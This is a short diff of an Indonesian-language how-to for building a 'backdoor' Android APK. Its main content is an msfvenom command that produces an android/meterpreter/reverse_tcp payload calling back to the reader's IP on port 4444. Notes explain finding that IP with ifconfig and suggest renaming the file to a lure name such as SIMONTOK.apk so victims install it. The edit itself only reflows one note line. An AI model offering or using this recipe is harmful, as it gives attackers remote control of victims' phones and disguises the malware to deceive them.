@@ -3,7 +3,8 @@ Cara membuat apk bacdoor kamka :v
 cd metasploit-framework
 ./msfvenom -p android/meterpreter/reverse_tcp LHOST=(ip elo)  LPORT=4444 -o /sdcard/backdoor.apk
 
-NOTE :ip local elo note buja tab baru ketik ifconfig lalu tekan enter NAH di situ ada tulisan inet kalian liat yang
+NOTE :ip local elo 
+note juga tab baru ketik ifconfig lalu tekan enter NAH di situ ada tulisan inet kalian liat yang
  paling bawah ya kalian copy ip kalian
 
 NOTE LAGI: nama backdoor itu bisa kalian ganti bebas bisa juga kalian ganti jadi SIMONTOK.apk
